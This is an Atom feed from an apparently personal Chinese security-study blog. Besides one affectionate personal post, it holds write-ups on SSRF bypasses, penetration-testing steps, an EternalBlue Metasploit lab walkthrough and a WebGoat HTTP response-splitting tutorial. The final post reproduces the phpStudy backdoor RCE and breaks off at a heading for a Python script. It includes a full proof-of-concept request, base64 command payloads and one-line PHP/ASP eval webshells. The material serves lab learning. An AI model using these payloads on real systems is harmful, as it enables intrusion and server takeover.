<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://jinqipiaopiao.github.io/</id>
    <title>Gridea</title>
    <updated>2022-04-07T09:23:35.112Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://jinqipiaopiao.github.io/"/>
    <link rel="self" href="https://jinqipiaopiao.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://jinqipiaopiao.github.io/images/avatar.png</logo>
    <icon>https://jinqipiaopiao.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[我的宝贝薛逸敏]]></title>
        <id>https://jinqipiaopiao.github.io/post/wo-de-bao-bei-xie-yi-min/</id>
        <link href="https://jinqipiaopiao.github.io/post/wo-de-bao-bei-xie-yi-min/">
        </link>
        <updated>2022-04-07T09:19:09.000Z</updated>
        <content type="html"><![CDATA[<p><strong>美丽篇</strong></p>
<pre><code>    你是那么美丽，总感觉有无数的魅力，也有无数的美丽之处，要说最漂亮的还得是你的眼睛，那卡姿兰大眼睛让人一看就难以忘怀
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1649323278110.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[SSRF漏洞]]></title>
        <id>https://jinqipiaopiao.github.io/post/ssrf-lou-dong/</id>
        <link href="https://jinqipiaopiao.github.io/post/ssrf-lou-dong/">
        </link>
        <updated>2021-12-16T02:18:37.000Z</updated>
        <content type="html"><![CDATA[<p><strong>ssrf介绍：</strong><br>
ssrf漏洞（服务器端请求伪造）：是一种有攻击者构造形成由服务器端发起请求的一个安全漏洞。一般情况下，ssrf攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务器端请求到与他相连而与外网隔离的内部系统）</p>
<p><strong>ssrf漏洞原理：</strong><br>
ssrf形成的原因都是由于服务器端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定url地址获取网页文本内容，加载指定地址的图片，下载，等等。利用的是服务器端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<p><strong>ssrf利用手段：</strong><br>
1.可以对外网，内网，本地进行端口扫描，某些情况下端口的banner会回显出来（比如3306）<br>
2.攻击运行在内网或本地的有漏洞程序（比如溢出）<br>
3.可以对内网web应用进行指纹识别，原理是通过请求默认的文件得到指定的指纹<br>
4.攻击内网或外网有漏洞的web应用<br>
5.使用file：//协议读取本地协议（或者其他协议）<br>
http://www.xingkonglangzi.com/ssrf.php?url=192.168.1.10:3306<br>
http://www.xingkonglangzi.com/ssrf.php?url=file:///c:/windows/win.ini</p>
<p><strong>漏洞出现点：</strong><br>
1.分享：通过url地址分享网页内容<br>
2.转码服务（通过url地址把原地址的网页内容调优，使其适合手机屏幕的浏览）<br>
3.在线翻译<br>
4.图片加载与下载：铜鼓ourl地址加载或下载图片<br>
5.图片，文章收藏功能<br>
6.未公开的api实现及调用url的功能<br>
7.从url关键字中寻找<br>
<img src="https://jinqipiaopiao.github.io//post-images/1639621798026.png" alt="" loading="lazy"></p>
<p><strong>ssrf漏洞绕过方法：</strong><br>
　　1.@　　　　　　　　　　http://abc.com@127.0.0.1</p>
<p>2.添加端口号　　　　　　http://127.0.0.1:8080</p>
<p>3.短地址　　　　　　　　https://0x9.me/cuGfD</p>
<p>4.可以指向任意ip的域名　 xip.io</p>
<p>5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制）</p>
<p>6.非HTTP协议</p>
<p>7.DNS Rebinding（ 域名重新绑定攻击技术）<br>
<strong>SSRF漏洞绕过方法：</strong></p>
<p>1.基本判断（排除法）</p>
<p>如：http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</p>
<p>排除法一：直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</p>
<p>排除法二：使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1639622332133.png" alt="" loading="lazy"><br>
SSRF漏洞图片分享:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1639622358377.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1639622337008.png" alt="" loading="lazy"><br>
SSRF漏洞的修复建议：</p>
<p>1.限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。</p>
<p>2.限制不能访问内网的IP，以防止对内网进行攻击。</p>
<p>3.屏蔽返回的详细信息。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透测试的步骤]]></title>
        <id>https://jinqipiaopiao.github.io/post/shen-tou-ce-shi-de-bu-zou/</id>
        <link href="https://jinqipiaopiao.github.io/post/shen-tou-ce-shi-de-bu-zou/">
        </link>
        <updated>2021-12-15T01:59:02.000Z</updated>
        <content type="html"><![CDATA[<p>先说说渗透测试相关名词含义：<br>
一些前置知识（包含但不限于）</p>
<p>脚本（asp、php、jsp）<br>
html（css、js、html）<br>
HTTP协议<br>
CMS（B/S）<br>
Webshell：通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。<br>
木马：通过向服务端提交一句简短代码，配合本地客户端实现weshell功能的木马<br>
&lt;%eval request(“pass”)%&gt;<br>
&lt;%execute(request(“pass”))%&gt;<br>
request(“pass”)接收客户端提交的数据，pass为执行命令的参数值。<br>
eval/execute 函数执行客户端命令的内容</p>
<p>提权：操作系统底权限的账户将自己提升为管理员权限使用的方法<br>
漏洞：硬件、软件、协议等可利用安全缺陷，可能被攻击者利用，对数据进行篡改、控制等<br>
肉鸡：被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业、个人、政府等所有单位。<br>
抓鸡：利用使用量大的程序的漏洞，使用自动化方式获取肉鸡的行为<br>
后门：黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。<br>
跳板：使用肉鸡IP来实施攻击其他目标，以便更好的隐藏自己的身份信息。<br>
旁站入侵：即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。<br>
C段入侵：即同c段下服务器入侵。如目标ip为192.168.180.253 入侵192.168.180.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。<br>
黑盒入侵：在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。<br>
白盒测试：相对黑盒测试，白盒测试基本是从内部发起。白盒测试与黑盒测试恰恰相反，测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的代码片断，也能够与单位的其它员工进行面对面的沟通。<br>
黑白盒的另一种说法：知道源代码和不知道源代码的渗透测试。这时，黑盒测试还是传统的渗透测试，而白盒测试偏向于代码审计。<br>
APT攻击：Advanced Persistent Threat，高级可持续性攻击，是指组织(特别是政府)或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。</p>
<p>1.极强的隐蔽性<br>
2.潜伏期长，持续性强<br>
3.目标性强<br>
一般渗透测试的流程：<br>
明确目标-》信息收集-》漏洞探测-》漏洞验证-》信息分析-》获取所需-》信息整理-》形成报告</p>
<h1 id="1明确目标">1.明确目标</h1>
<p>确定范围：测试目标的范围，ip，域名，内外网，测试账户<br>
确定规则：能测试到什么程度，所需要的时间，能否修改上传，能否提权等等<br>
确定需求：web应用的漏洞，业务逻辑漏洞，人员权限管理漏洞等等</p>
<h1 id="2信息收集">2.信息收集</h1>
<p>方式：主动扫描，开放搜索等<br>
开放搜索：利用搜索引擎获得：后台，未授权页面，敏感url等等<br>
基础信息：ip，网段，域名，端口<br>
应用信息：各端口的应用。例如web应用，邮件应用等等<br>
系统信息：操作系统版本<br>
版本信息：所有这些能探测到的东西的版本<br>
服务信息：中间件的各类信息，插件信息<br>
人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等<br>
防护信息：试着看能否探测到防护设备</p>
<h1 id="3漏洞探测">3.漏洞探测</h1>
<p>利用上一步列出的个各种系统，应用等使用相应的漏洞<br>
方法：<br>
1）漏扫，awvs，ibm appscan等<br>
2）结合漏洞去exploit-db等位置找利用<br>
3）在网上寻找验证poc</p>
<h1 id="4漏洞验证">4.漏洞验证</h1>
<p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验成功后再应用于目标中。<br>
自动化验证：结合自动化扫描工具提供的结果<br>
手工验证：根据公开资源进行验证<br>
试验验证：自己搭建模拟环境进行验证<br>
登陆才接：有时可以尝试一下登录口的账号密码等信息<br>
业务漏洞验证：如发现业务漏洞，要进行验证<br>
公开资源的利用<br>
exploit-db/wooyun/<br>
google hacking<br>
渗透代码网站<br>
通用，缺省口令<br>
产商的漏洞警告等等</p>
<h1 id="5信息分析">5.信息分析</h1>
<p>为下一步实施渗透做好准备<br>
精准打击：准备好上一步探测到的漏洞的exp，用来精准打击<br>
绕过防御机制：是否有防火墙等设备，如何绕过<br>
定制攻击路径：最佳工具路径，流量监控，杀毒软件，恶意代码检测等<br>
攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</p>
<h1 id="6获取所需">6.获取所需</h1>
<p>实施攻击：根据前几步的结果，进行攻击<br>
获取内部信息：基础设施（网络连接，vpn，路由，拓扑）<br>
进一步渗透：内网入侵，敏感目标<br>
持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理站好，驻扎手法等<br>
清理痕迹：清理先骨干日志（访问，操作）上传文件</p>
<h1 id="7信息整理">7.信息整理</h1>
<p>整理渗透工具：整理渗透过程中用到的代码，poc，exp等<br>
整理收集信息：整理渗透过程中收集到的一切信息<br>
整理漏洞信息：整理渗透过程中遇到的个汇总漏洞，各种脆弱位置i西南西</p>
<h1 id="8形成报告">8.形成报告</h1>
<p>按需整理：按照之前第一步跟客户去定好的范围，需求来整理资料，并将资料形成报告<br>
补充介绍：要对漏洞成因，验证过程和带来危害进行分析</p>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1639535297913.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[永恒之蓝利用]]></title>
        <id>https://jinqipiaopiao.github.io/post/yong-heng-zhi-lan-li-yong/</id>
        <link href="https://jinqipiaopiao.github.io/post/yong-heng-zhi-lan-li-yong/">
        </link>
        <updated>2021-11-21T01:50:12.000Z</updated>
        <content type="html"><![CDATA[<p>是什么？<br>
永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p>
<p>攻击机：192.168.80.128（kali安装Metaploit工具）<br>
靶机：192.168.80.129</p>
<p>Metasploit框架（简称MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编 写的模板化框架，具有很好的扩展性，便于渗透测试人员开发，使用定制的工具模板。</p>
<p>该工具有六个模块，分别为辅助模块(auxiliary)、渗透攻击模块<br>
(exploits）、后渗透攻击模块(post)、攻击载荷模块(payloads)、空指令模<br>
块(nops）、编码器模块(encoders)，其中msf为总模块，其他均为分支模<br>
块。</p>
<p>首先扫描靶机的系统以及有什么漏洞（用nmap在一般扫描端口的后边添加--script=vuln）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460510357.png" alt="" loading="lazy"><br>
扫描出来的在VULNERABLE<br>
ms17-010<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460513795.png" alt="" loading="lazy"><br>
然后启动msf<br>
msfconsole<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460506427.png" alt="" loading="lazy"><br>
查找有没有ms17-010<br>
search ms17-010<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460501665.png" alt="" loading="lazy"><br>
然后利用第二个可以直接use2或者把全名都写上<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460495844.png" alt="" loading="lazy"><br>
然后用show options查看需要配置什么<br>
设置payload<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460491818.png" alt="" loading="lazy"><br>
设置RHOST<br>
设置LHOST<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460487113.png" alt="" loading="lazy"><br>
然后就可以run进行攻击了</p>
<p>如果出现target相关的则需要设置相关的target<br>
可以先showtargets然后再set target<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460478202.png" alt="" loading="lazy"></p>
<p>最后一条龙利用<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637475239222.png" alt="" loading="lazy"><br>
<strong>报错解决：</strong></p>
<p>关闭防火墙<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637461856816.png" alt="" loading="lazy"><br>
win+r打开service.msc关闭firewall服务</p>
<p>如果出现错误<br>
<img src="https://jinqipiaopiao.github.io//post-images/1637460483339.png" alt="" loading="lazy"><br>
则需要<br>
set FORCEEXPLOIT true</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[OWASP]]></title>
        <id>https://jinqipiaopiao.github.io/post/owasp/</id>
        <link href="https://jinqipiaopiao.github.io/post/owasp/">
        </link>
        <updated>2021-11-11T12:58:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="webgoat-v54">WebGoat v5.4</h1>
<p>1.General<br>
<strong>Http Basics</strong><br>
没啥讲的直接往里输个字符都能过<br>
<strong>Http Splitting</strong></p>
<p>＜－＞原理简介  http响应头截断是一种新的攻击技术，由该技术衍生了许多攻击的方法：web cache poisoning，cross user defacement，cross –site scripting等。攻击者利用它 可以获取用户的敏感信息甚至是包含用户名和密码的认证信息。在许多环境下都存在该攻击的可能，Microsoft ASP ,ASP NET, IBM WEBSPHERE,比较流行的的服务器，apache ，squid，还有浏览器IE6.0 SP1.</p>
<pre><code>           造成http响应头截断漏洞的主要原因是对用户提交的非法字符没有进行严格的过滤，尤 其是CR,LF字符的输入。攻击者通过发送一经过精心构造的request，迫使服务器认为其返回的数据是两个响应，而不是常规的一个响应。当可以通过精心制作的request完全 控制第二个响应时，可以通过这样来实现攻击：发送两个请求A，B。A请求包含构造数据，该请求致使服务器返回两个响应R1，R2，其中R2是可以通过在A中的精心构造而 完全控制的。服务器将R1作为response返回给A，而第R2则被服务器作为B的response而返回给了B﹙即使R2并不是服务器自己生成的）。

Request A-------------＞Web Server（R1，R2）
Request B-------------＞Web Server (本该是R3)
Web Server（R1）------------＞A
Web Server（R2）——————＞B
</code></pre>
<p>HTTP Response Splitting翻译为HTTP应答拆分，是利用Web应用程序缺乏有效的输入验证，允许攻击者将CR 和LF 字符插入到应用程序响应的报头，从而将服务器的回应“拆分”成两个不同的HTTP 消息。攻击者通过发送一经过精心构造的HTTP请求，试图完全控制第二个响应来实现攻击。</p>
<p>一些Web 应用程序使用用户输入的一部分产生响应中的报头的值，常见的例子是根据用户提交的值进行的重定向目标URL。例如某Web应用会根据用户选择不同的语言作为参数传递并用于响应报头中触发对相关网页的重定向，其代码如下：</p>
<pre><code>&lt;% Response.sendRedirect(“/by_lang.jsp?lang=”+request.getParameter(“lang”)); %&gt;
</code></pre>
<p>正常情况下，当用户输入其选择的语言的时候，比如english，那么会跳转到/by_lang.jsp?lang=English页面，其响应如下：</p>
<pre><code>HTTP/1.1 302 Moved Temporarily
Date:Wed,24 Dec 2003 12:53:28 
Location: http://victim.com/by_lang.jsp?lang=english
Server: Apache Coyote/1.1
Content-Type: text/html
Set-Cookie: JSESSIONID=1PMRZOIQQzZIE6iivsREG82pq9B017h4YoHZ62RXjApqwBE 
Connection:Close
</code></pre>
<p>从以上可以看到的是：输入的参数（english）已经提交到HTTP头中，这样我们就可以构造特殊的字符来拆分HTTP头，并到其后追加一个自己构造的头。比如我们提交如下的参数（已经过URLEncoding）：（最重要就是想要使它返回的是200）</p>
<pre><code>foobar%0d%0aContent-Length:%200%0d%0a%0d%oaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%Content-Length:%2019%0d%0a%0d%0a&lt;html&gt;Hacked&lt;/html&gt;
解密后：
foobar
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 19

&lt;html&gt;Hacked&lt;/html&gt;
</code></pre>
<p>那么服务器返回的响应如下：</p>
<pre><code>HTTP/1.1 302 Moved Temporarily
Date:Wed,24 Dec 2003 15:26:41 GMT 
Location: http://victim.com/by_lang.jsp?lang=foobar
Content-Length:0

HTTP/1.1 200 OK
Content-Type: text/html
Content-length: 19
&lt;html&gt;Hacked&lt;/html&gt;
Server: Apache Coyote/1.1
Content-Type: text/html
Set-Cookie: JSESSIONID=1PMRZOIQQzZIE6iivsREG82pq9B017h4YoHZ62RXjApqwBE 
Connection:Close
</code></pre>
<p>其中第一个响应是302 重定向的响应，第二个响应是我们自己构造的响应。当客户端收到第一个响应之后会像相应头的Location指向的目标发起第二个请求，而这个时候客户端会认为第二个响应正是针对第二个请求的响应，从而达到了欺骗的目的。</p>
<p>WebGoat里面有针对这个漏洞的教程。登录到WebGoat的界面后，访问General?HTTP Splitting页面即可进入HTTP应答拆分攻击的教程。这个分为两个阶段，第一阶段仅仅只是要求能够使用HTTP应答拆分的漏洞进行攻击，第二阶段则更进一步的要求能够使用HTTP响应头的Last-Modified字段污染使用者的缓存。</p>
<p>为了判断页面是否可能存在HTTP应答拆分漏洞，我们先启动WebScarab，并且把浏览器的代理设置为WebScarab。然后进行正常输入后，从下图WebScarab上分析正常输入的请求与响应后可以发现在服务器的响应头中，重定向地址里面的Language这个参数恰好是我们通过浏览器提交的参数，这样就存在HTTP应答拆分漏洞的可能性。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636636865870.JPG" alt="" loading="lazy"></p>
<p>我们可以进一步通过渗透性测试来判断是否真的存在这样的漏洞。首先来看看正常情况下服务器的响应信息如下：</p>
<pre><code>HTTP/1.1 302 Moved Temporarily
Server: Apache-Coyote/1.1
Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test
Content-Type: text/html;charset=ISO-8859-1
Content-length: 0
Date: Fri, 03 Aug 2012 06:52:48 GMT
</code></pre>
<p>我们把这个响应修改为我们希望的样子：</p>
<pre><code>HTTP/1.1 302 Moved Temporarily
Server: Apache-Coyote/1.1
Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test
Content-length: 0

HTTP/1.1 200 OK
Content-Type: text/html;
Content-length: 19

&lt;html&gt;hacked&lt;/html&gt;
Content-Type: text/html;charset=ISO-8859-1
Content-length: 0
Date: Fri, 03 Aug 2012 06:52:48 GMT


那么中间从test到&lt;/html&gt;的部分就是我们将要提交的内容，把这部分内容进行一下URLEncode之后转换成如下形式：

test%0d%0aContent-length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%3b%0d%0aContent-length%3a+19%0d%0a%0d%0a%26lt%3bhtml%26gt%3bhacked%26lt%3b%2fhtml%26gt%3b
</code></pre>
<p>这一段字符串就可以作为参数来进行提交了，我们把这段数据输入到WebGoat教程的的输入框里面并提交，就可以看到课程第一阶段成功完成：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636636924465.JPG" alt="" loading="lazy"></p>
<p>刷新一下进入课程的第二阶段，课程的第二阶段要求我们能进一步污染受害者的缓存。为了做到这一点，我们需要在前面提交的参数中，自己伪造的HTTP响应头中添加一个Last-Modified字段，并且把它的值设为一个未来的值。这样当浏览器在下次请求同一个页面的时候发送If-Modified-Since字段并且这个值是一个未来的值，服务器在发现这个值大于该页面最后修改时间之后将返回HTTP的304响应码表示该页面没有更新过，从而达到了污染受害者缓存的目的。下面就是我们希望的能够污染受害者缓存的服务器响应，其中同样从test到<code>&lt;/html&gt;</code>部分就是我们需要提交的参数：</p>
<pre><code>HTTP/1.1 302 Moved Temporarily
Server: Apache-Coyote/1.1
Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test
Content-length: 0

HTTP/1.1 200 OK
Content-Type: text/html;
Last-Modified: Thu, 01 Jan 2099 12:00:00 GMT 
Content-length: 19

&lt;html&gt;hacked&lt;/html&gt;
Content-Type: text/html;charset=ISO-8859-1
Content-length: 0
Date: Fri, 03 Aug 2012 06:52:48 GMT
</code></pre>
<p>同样把需要提交的部分内容进行一下URLEncode之后转换成如下形式：（最重要的就是添加一个新的参数名Last-Modified:）</p>
<pre><code>test%0d%0aContent-length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%3b%0d%0aLast-Modified%3a+Thu%2c+01+Jan+2099+12%3a00%3a00+GMT+%0d%0aContent-length%3a+19%0d%0a%0d%0a%26lt%3bhtml%26gt%3bhacked%26lt%3b%2fhtml%26gt%3b
</code></pre>
<p>把这段数据输入到WebGoat并提交之后就可以看到课程成功完成：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636637042112.JPG" alt="" loading="lazy"><br>
这边有个需要特别提出来解释一下的地方。可能有些细心的人已经发现了，当我们在WebGoat中提交上面所说的内容之后服务器真实的响应如下：</p>
<pre><code>HTTP/1.1 302 Moved Temporarily
Server: Apache-Coyote/1.1
Location: http://localhost/WebGoat/attack?Screen=3&amp;menu=100&amp;fromRedirect=yes&amp;language=test%0d%0aContent-length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%3b%0d%0aContent-length%3a+19%0d%0a%0d%0a%26lt%3bhtml%26gt%3bhacked%26lt%3b%2fhtml%26gt%3b%0d%0a
Content-Type: text/html;charset=ISO-8859-1
Content-length: 0
Date: Fri, 03 Aug 2012 08:53:22 GMT
</code></pre>
<p>这并不是我们一开始所期望的样子，那么这是怎么回事儿呢？这是因为现在的主流Web服务器比如IIS，Apache HTTP Server以及WebGoat使用的Tomcat等等都有对这个问题作过改进，服务器会对即将发送出去的HTTP响应头里面每一项的值都会做一定的编码或者转换，以避免这个问题。比如Tomcat就响应头中的每一项的值都做过了URLEncode，从而保证即使Web应用存在HTTP应答拆分的漏洞，Web服务器上也从底层平台的角度保证了尽可能避免HTTP应答拆分漏洞带来的威胁。所以如果想要在自己的实验室环境中重现对HTTP应答拆分漏洞的成功利用，可以尝试安装比较老的Web服务器版本，比如Tomcat 4.1.24之前的版本。另外客户端也会有些关系，因为客户端可能会在每次请求后完全收取服务器响应回来的数据，并且把超出范围的多余数据丢弃，这样也可以避免HTTP应答拆分攻击可能造成的影响。我在自己的实验室环境中重现这个问题的时候采用了Apache 2.0.48并且通过mod_proxy来作为HTTP代理，Tomcat 4.1.23作为Web服务器，然后Web应用使用了下面这个有漏洞的JSP程序，就可以看到成功利用HTTP应答拆分漏洞之后的输出。</p>
<pre><code>&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot;%&gt;
&lt;% 
String user_language = request.getParameter(&quot;user_language&quot;);
System.out.println(user_language);
response.sendRedirect(&quot;/&quot;+user_language+&quot;.jsp&quot;); 
%&gt;
</code></pre>
<p>————————————————<br>
版权声明：本文为CSDN博主「花花浪客」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/eatmilkboy/article/details/8061159</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PHP远程RCE漏洞复现以及沦陷主机入侵溯源分析]]></title>
        <id>https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/</id>
        <link href="https://jinqipiaopiao.github.io/post/php-yuan-cheng-rce-lou-dong-fu-xian-yi-ji-lun-xian-zhu-ji-ru-qin-su-yuan-fen-xi/">
        </link>
        <updated>2021-11-03T09:02:02.000Z</updated>
        <content type="html"><![CDATA[<p>文章目录:</p>
<p>1.phpstudy后门检测</p>
<p>2.phpstudy远程RCE后门复现图文教程</p>
<p>3.phpstudy远程RCE后门复现教视频程</p>
<p>3.Python编写复现脚本</p>
<p>4.Python编写批量复现脚本</p>
<p>5.针对部署phpstudy环境服务器已沦陷的主机进行溯源分析/黑客入侵画像</p>
<p>6.修复建议</p>
<p>7.参考</p>
<p>准备工具：</p>
<p>VMware Workstation Pro</p>
<p>Windows7的/ 2008R2</p>
<p>BurpSuiteFree</p>
<p>phpStudy20161103.zip（文中使用）phpStudy20180211.zip</p>
<p>Python</p>
<p><strong>一、phpstudy后门检测：</strong><br>
(1)phpStudy20161103 后门位置存在于：</p>
<pre><code>*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll

*:\phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll
</code></pre>
<p>(2)phpStudy20180211后门位置存在于：</p>
<pre><code>*:\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll

*:\PHPTutorial\PHP\PHP-5.4.45\ext\php_xmlrpc.dll
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932261789.png" alt="" loading="lazy"><br>
(3)找到“ php_xmlrpc，dll”后用记事本打开，“ Ctrl + F”搜索“ @eva ”字符串如果存在就存在后门：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932265747.png" alt="" loading="lazy"><br>
(4)Phpstudy后门分析文章传送门：</p>
<pre><code>https://www.freebuf.com/news/topnews/214912.html

https://www.cppentry.com/bencandy.php?fid=85&amp;id=261791
</code></pre>
<p><strong>二、phpstudy远程RCE后门复现图文教程:</strong><br>
(1)虚拟机搭建好Phpstudy环境，我这里使用的是phpstudy2016版本<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932271003.png" alt="" loading="lazy"><br>
Phpstudy环境192.168.1.91</p>
<p>(2)浏览器访问靶机地址：http：//192.168.1.91/<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932276373.png" alt="" loading="lazy"><br>
(3)浏览器设置本地代理并且打开BurpSuiteFree抓包<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932281265.png" alt="" loading="lazy"><br>
<strong>(4)phpstudy RCE POC：</strong></p>
<pre><code>GET / HTTP/1.1

Host: 192.168.43.99

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:69.0) Gecko/20100101 Firefox/69.0

Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip,deflate

Accept-Charset:&quot;commandbase64 string&quot;

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
</code></pre>
<p><strong>(5)CTRL + R把请求包转发到中继器模块</strong></p>
<p>Accept-Charset:&quot;command base64 string&quot;中执行命令经过了的的Base64编码加密：</p>
<p>执行语句指令：system('whoami');</p>
<p>BASE64 编码后：c3lzdGVtKCd3aG9hbWknKTs =</p>
<p>替换进去</p>
<p>Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=</p>
<p>还要把“ ”中的前面的空格删除。Accept-Encoding: gzip, deflatedeflate</p>
<p><strong>(6)构造好执行语句为WHOAMI的POC如下：</strong></p>
<pre><code>GET / HTTP/1.1

Host: 192.168.1.91

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64;rv:69.0) Gecko/20100101 Firefox/69.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip,deflate

Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932289618.png" alt="" loading="lazy"><br>
（whoami执行结果）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932294964.png" alt="" loading="lazy"><br>
（net user执行查询查询查询查询结果）<br>
(7)写入webshel升的操作</p>
<p>可以使用待办事项命令下ECHO 实现</p>
<p>系统（“ write_webshell”）；</p>
<p>(8)完整写出webshel升的语句：</p>
<pre><code>ECHO ^&lt;?php @eval($_POST[cmd]);?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php
</code></pre>
<p>(10)拼接后的语句</p>
<pre><code>system(' ECHO ^&lt;?php@eval($_POST[cmd]); ?^&gt;&gt;&quot;C:/phpStudy/WWW/demon.php ');
</code></pre>
<p>(11)拼接好Base64 编码后的代码：</p>
<pre><code>c3lzdGVtKCcgRUNITyBePD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Xj4+IkM6L3BocFN0dWR5L1dXVy9kZW1vbi5waHAgJyk7
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635932301784.png" alt="" loading="lazy"><br>
（成功写入的webshel）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932311623.png" alt="" loading="lazy"><br>
（中国蚁剑连接成功）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1635932316526.png" alt="" loading="lazy"><br>
（ 中国蚁剑链接的webshel升命令执行成功）<br>
<strong>三、Python复现phpstudy远程RCE漏洞：</strong><br>
